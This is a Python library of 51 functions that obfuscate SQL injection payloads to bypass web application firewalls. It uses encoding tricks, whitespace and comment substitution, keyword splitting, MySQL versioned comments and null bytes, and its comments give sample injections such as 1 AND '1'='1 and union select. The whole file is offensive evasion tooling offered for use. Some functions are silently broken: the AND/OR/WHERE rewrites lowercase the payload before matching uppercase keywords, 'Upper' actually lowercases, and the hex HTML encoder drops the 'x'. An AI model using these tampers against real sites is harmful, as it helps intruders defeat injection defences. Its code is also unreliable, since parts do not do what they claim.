#!/usr/bin/python3

import re
import base64
import random
import string

# Modification Functions
# Resources:
# https://book.hacktricks.xyz/pentesting-web/sql-injection#waf-bypass (Whitespace, No commas, Generic)
# https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
# https://portswigger.net/support/sql-injection-bypassing-common-filters
# https://ieeexplore.ieee.org/abstract/document/9074217#full-text-header
# https://github.com/sqlmapproject/sqlmap/tree/master/tamper
# https://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128
# https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/
# https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf

# 51 Modifications

modifyFunctions = [
    "singleQuoteBypassWithUnicodeEnc",
    "singleQuoteBypassWithNullEnc",
    "base64Encode",
    "doubleEncodeBypass",
    "urlEncodeBypass",
    "urlUnicodeEncodeBypass",
    "urlUnicodeEscapeEncodeBypass",
    "hexEncodeBypass",
    "charUnicodeEscapeBypass",
    "htmlEncodeInDecimal",
    "htmlEncodeInHex",
    "htmlEncodeInHexSpecial",
    "newLineWithHash",
    "whiteSpaceBypassWith20",
    "whiteSpaceBypassWith09",
    "whiteSpaceBypassWith0D",
    "whiteSpaceBypassWith0C",
    "whiteSpaceBypassWith0B",
    "whiteSpaceBypassWith0A",
    "whiteSpaceBypassWithA0",
    "whiteSpaceBypassWithComments",
    "whiteSpaceBypassWithMoreComments",
    "whiteSpaceBypassWithEvenMoreComments",
    #"whiteSpaceBypassWithParenthesis",
    "whiteSpaceBypassWithHashRandomStringAndNewLine",
    "whiteSpaceBypassWithDashNewLine",
    "whiteSpaceBypassWithPlus",
    "noCommaBypassLimitSubstrMid",
    "genericBypassAND",
    "genericBypassANDEnc",
    "genericBypassOR",
    "genericBypassOREnc",
    "genericBypassEqLike",
    "genericBypassEqRegExp",
    "genericBypassEqRLIKE",
    "genericBypassEqNot",
    "genericBypassGT",
    "genericBypassWHERE",
    "genericBypassWithComment",
    "genericBypassKeyWords",
    "genericBypassWith0B",
    "genericBypassWithNullBytePrepend",
    "genericBypassWithNullByteAppend",
    "genericBypassWithUpperLower",
    "genericBypassCommentsBeforeParenthesis",
    "genericBypassLower",
    "genericBypassUpper",
    "genericBypassANDWithCommand",
    "genericBypassANDWithMoreCommand",
    "genericMoreSpace",
    "genericORDtoASCII"
]

# Encoding

# 1 AND '1'='1 -> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871
def singleQuoteBypassWithUnicodeEnc(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('\'', '%EF%BC%87', payload))
    return arr

# 1 AND '1'='1 -> 1 AND %00%271%00%27=%00%271
def singleQuoteBypassWithNullEnc(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('\'', '%00%27', payload))
    return arr

# 1 AND '1'='1 -> MSBBTkQgJzEnPScx
def base64Encode(payloads):
    arr = []
    for payload in payloads:
        arr.append(base64.b64encode(payload.encode('utf-8')).decode('utf-8'))
    return arr

# 1 AND '1'='1 -> %2531%2520%2541%254e%2544%2520%2527%2531%2527%253d%2527%2531
def doubleEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        enc = []
        enc.append(''.join('%' + '{:02x}'.format(byte) for byte in payload.encode('utf-8')))
        y = ''.join(enc)
        enc2 = []
        for i in y:
            enc2.append('%25' if i == '%' else i)
        arr.append(''.join(enc2))
    return arr

# 1 AND '1'='1 -> %31%20%41%4e%44%20%27%31%27%3d%27%31
def urlEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join('%' + '{:02x}'.format(byte) for byte in payload.encode('utf-8')))
    return arr

# 1 AND '1'='1 -> %u0031%u0020%u0041%u004e%u0044%u0020%u0027%u0031%u0027%u003d%u0027%u0031
def urlUnicodeEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join(['%u{:04x}'.format(ord(char)) for char in payload]))
    return arr

# \x2e\x0\x68\x70
def urlUnicodeEscapeEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join([r'\x{:02x}'.format(ord(char)) for char in payload]))
    return arr

# 2E7068703F
def hexEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join('{:02x}'.format(byte) for byte in payload.encode('utf-8')))
    return arr

# SELECT FIELD FROM TABLE -> \\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045
def charUnicodeEscapeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join('\\\\u{:04x}'.format(byte) for byte in payload.encode('utf-8')))
    return arr

# ' -> &#39; (HTML encode in decimal all characters)
def htmlEncodeInDecimal(payloads):
    arr = []
    for payload in payloads:
        x = ""
        for char in payload:
            x += f"&#{ord(char)};"
        arr.append(x)
    return arr

# ' -> &#x27; (HTML encode in hexadecimal all characters)
def htmlEncodeInHex(payloads):
    arr = []
    for payload in payloads:
        x = ""
        for char in payload:
            x += f"&#{hex(ord(char))[2:]};"
        arr.append(x)
    return arr

# ' -> &#39; (HTML encode all special characters)
def htmlEncodeInHexSpecial(payloads):
    arr = []
    for payload in payloads:
        x = ""
        for char in payload:
            if char.isalnum() or char in {' ', '\t', '\n', '\r'}:
                x += char
            else:
                x += f"&#{hex(ord(char))[2:]};"
        arr.append(x)
    return arr

##########################################################################################

# White space bypass

# New Line + encoded # with digit at the end (Prepend %0A, encode #, and append 1)
# 1 AND '1'='1 # -> %0A1 AND '1'='1 %231
def newLineWithHash(payloads):
    arr = []
    for payload in payloads:
        arr.append(f"%0A{re.sub('#', '%23', payload)}1")
    return arr

# 1 AND '1'='1 -> 1%20AND%20'1'='1
def whiteSpaceBypassWith20(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%20', payload))
    return arr

# 1 AND '1'='1 -> 1%09AND%09'1'='1
def whiteSpaceBypassWith09(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%09', payload))
    return arr

# 1 AND '1'='1 -> 1%0DAND%0D'1'='1
def whiteSpaceBypassWith0D(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%0D', payload))
    return arr

# 1 AND '1'='1 -> 1%0CAND%0C'1'='1
def whiteSpaceBypassWith0C(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%0C', payload))
    return arr

# 1 AND '1'='1 -> 1%0BAND%0B'1'='1
def whiteSpaceBypassWith0B(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%0B', payload))
    return arr

# 1 AND '1'='1 -> 1%0AAND%0A'1'='1
def whiteSpaceBypassWith0A(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%0A', payload))
    return arr

# 1 AND '1'='1 -> 1%A0AND%A0'1'='1
def whiteSpaceBypassWithA0(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%A0', payload))
    return arr

# 1 AND '1'='1 -> 1/**/AND/**/'1'='1
def whiteSpaceBypassWithComments(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '/**/', payload))
    return arr

# 1 AND '1'='1 -> 1/*comment*/AND/*comment*/'1'='1
def whiteSpaceBypassWithMoreComments(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '/*comment*/', payload))
    return arr

# SELECT id FORM users -> SELECT/**_**/id/**_**/FROM/**_**/users
def whiteSpaceBypassWithEvenMoreComments(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '/**_**/', payload))
    return arr

# 1 and 1=1 -- -> (1)and(1)=(1)--
def whiteSpaceBypassWithParenthesis(payloads):
    arr = []
    for payload in payloads:
        x = ""
        i = 0
        while i < len(payload):
            if payload[i].isdigit():
                x += "(" + payload[i] + ")"
            elif payload[i] == "=":
                x += "(=)"
            elif payload[i] == " ":
                x += ""
            else:
                x += payload[i]
            i += 1
        arr.append(x)
    return arr

# 1 AND 9227=9227 -> 1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227 (Space -> #RANDOMTEXT%0A)
def whiteSpaceBypassWithHashRandomStringAndNewLine(payloads):
    arr = []
    for payload in payloads:
        x = ''.join(random.choices(string.ascii_letters, k=10))
        arr.append(re.sub(r'\s+', '%23' + x + '%0A', payload))
    return arr

# 1 AND 9227=9227 -> 1--%0AAND--%0A9227=9227
def whiteSpaceBypassWithDashNewLine(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '--%0A', payload))
    return arr

# space -> +
def whiteSpaceBypassWithPlus(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '+', payload))
    return arr

##########################################################################################

# No commas bypass

# LIMIT 0,1 -> LIMIT 1 OFFSET 0
# SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1)
# MID(VERSION(), 1, 1) -> MID(VERSION() FROM 1 FOR 1)
def noCommaBypassLimitSubstrMid(payloads):
    arr = []
    limitPattern = r'LIMIT\s*(?:\/\*.*?\*\/|\+)?\s*(\d+)\s*(?:\/\*.*?\*\/|\+)?\s*,\s*(\d+)'
    substrPattern = r'\b(substr)\s*\(\s*([^,]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)'
    midPattern = r'\b(MID)\s*\(\s*([^,]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)'

    def replaceLimit(match):
        limit = int(match.group(2))
        offset = int(match.group(1))
        return f"LIMIT {limit} OFFSET {offset}"
       
    def replaceSubstr(match):
        string = match.group(2)
        start = int(match.group(3))
        length = int(match.group(4))
        return f"SUBSTR({string} FROM {start} FOR {length})"

    def replaceMid(match):
        string = match.group(2)
        start = int(match.group(3))
        length = int(match.group(4))
        return f"MID({string} FROM {start} FOR {length})"
    
    for payload in payloads:
        x = re.sub(limitPattern, replaceLimit, payload, flags=re.IGNORECASE)
        x = re.sub(substrPattern, replaceSubstr, x, flags=re.IGNORECASE)
        x = re.sub(midPattern, replaceMid, x, flags=re.IGNORECASE)
        arr.append(x)
    return arr

##########################################################################################

# Generic

# AND -> &&
def genericBypassAND(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('AND', '&&', payload.lower()))
    return arr

# AND -> %26%26
def genericBypassANDEnc(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('AND', '%26%26', payload.lower()))
    return arr

# OR -> ||
def genericBypassOR(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('OR', '||', payload.lower()))
    return arr

# OR -> %7C%7C
def genericBypassOREnc(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('OR', '%7C%7C', payload.lower()))
    return arr

# = -> LIKE
def genericBypassEqLike(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('=', ' LIKE ', payload))
    return arr

# = -> REGEXP
def genericBypassEqRegExp(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('=', ' REGEXP ', payload))
    return arr

# = -> RLIKE
def genericBypassEqRLIKE(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('=', ' RLIKE ', payload))
    return arr

# = -> not < and not >
def genericBypassEqNot(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('=', ' not < and not > ', payload))
    return arr

# > X -> not between 0 and X
def genericBypassGT(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'>\s*(\d+)', r' not between 0 and \1', payload, flags=re.IGNORECASE))
    return arr

# WHERE -> HAVING
def genericBypassWHERE(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('WHERE', 'HAVING', payload.lower()))
    return arr

# union select -> un/**/ion se/**/lect
def genericBypassWithComment(payloads):
    arr = []
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, f'{method[:2]}/**/{method[2:]}', x)
        arr.append(x)
    return arr

# union select 1,2,3-- -> UNunionION SEselectLECT 1,2,3--
def genericBypassKeyWords(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, f'{method[:2].upper()}{method}{method[2:].upper()}', x)        
        arr.append(x)
    return arr

# union select 1,2,3-- -> uni%0Bon se%0Blect 1,2,3--
def genericBypassWith0B(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, f'{method[:2]}%0B{method[2:]}', x)        
        arr.append(x)
    return arr

# union select 1,2,3-- -> %00union select 1,2,3--
def genericBypassWithNullBytePrepend(payloads):
    arr = []
    for payload in payloads:
        arr.append(f'%00{payload}')
    return arr

# 1 AND 1=1 -> 1 AND 1=1%00
def genericBypassWithNullByteAppend(payloads):
    arr = []
    for payload in payloads:
        arr.append(f'{payload}%00')
    return arr

# select -> SeLeCt
def genericBypassWithUpperLower(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.split()
        for i, word in enumerate(x):
            for method in methods:
                if method.lower() in word.lower():
                    pattern = re.compile(re.escape(method), re.IGNORECASE)
                    x[i] = pattern.sub(lambda m: ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(m.group())]), word)
        arr.append(' '.join(x))
    return arr

# SELECT ABS(1) -> SELECT ABS/**/(1)
def genericBypassCommentsBeforeParenthesis(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'(\()', r'/**/\1', payload))
    return arr

# INSERT -> insert
def genericBypassLower(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, method.lower(), x)
        arr.append(x)
    return arr

# insert -> INSERT
def genericBypassUpper(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, method.lower(), x)
        arr.append(x)
    return arr

# 1 AND 2>1-- -> 1 /*!30963AND 2>1*/--
def genericBypassANDWithCommand(payloads):
    arr = []
    pattern1 = r'\b(AND|OR)\b'
    pattern2 = r'(--|#)'

    for payload in payloads:
        x = re.sub(pattern1, r'/*!30963\1', payload, flags=re.IGNORECASE)
        x = re.sub(pattern2, r'*/\1', x)
        arr.append(x)
    return arr

# 1 AND 2>1-- -> 1 /*!00000AND 2>1*/--
def genericBypassANDWithMoreCommand(payloads):
    arr = []
    pattern1 = r'\b(AND|OR)\b'
    pattern2 = r'(--|#)'

    for payload in payloads:
        x = re.sub(pattern1, r'/*!00000\1', payload, flags=re.IGNORECASE)
        x = re.sub(pattern2, r'*/\1', x)
        arr.append(x)
    return arr

# 1 UNION SELECT foobar -> 1     UNION     SELECT     foobar
def genericMoreSpace(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join([char + ' ' * 4 if char.isspace() else char for char in payload.lower()]))
    return arr

# ORD('42') -> ASCII('42')
def genericORDtoASCII(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\bord\b', 'ascii', payload, flags=re.IGNORECASE))
    return arr
